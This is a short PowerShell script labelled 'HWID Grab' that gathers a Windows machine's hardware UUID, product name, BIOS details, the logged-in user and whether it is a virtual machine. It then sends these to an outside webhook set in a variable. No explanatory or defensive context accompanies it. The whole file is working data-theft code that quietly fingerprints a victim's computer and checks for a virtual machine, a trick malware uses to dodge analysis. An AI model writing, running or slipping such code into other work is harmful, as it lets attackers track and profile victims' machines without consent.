$webhookUrl = "$dc"
Function isVM {

    $objWMI = Get-WmiObject Win32_BaseBoard
    
    $bln = ($objWMI.Manufacturer.Tolower() -match 'microsoft') -or ($objWMI.Manufacturer.Tolower() -match 'vmware')
    
    return $bln}
$content = wmic csproduct get uuid,name
$content2 = wmic bios get name,version
$content = $content+"`n`n$($content2)`n`nis a VM: $(isVM)`n`nTime: $(Get-Date)`nUser: $(whoami)"
[System.Collections.ArrayList]$embedArray = @()
$title       = 'HWID Grab'
$description = '```'+$content+'```'
$color       = '000111'
#Create embed object
$embedObject = [PSCustomObject]@{
    title       = $title
    description = $description
    color       = $color
}
#Add embed object to array
$embedArray.Add($embedObject) | Out-Null
#Create the payload
$payload = [PSCustomObject]@{
    'username' = 'HWID Grab'
    embeds = $embedArray
}
#Send over payload, converting it to JSON
Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'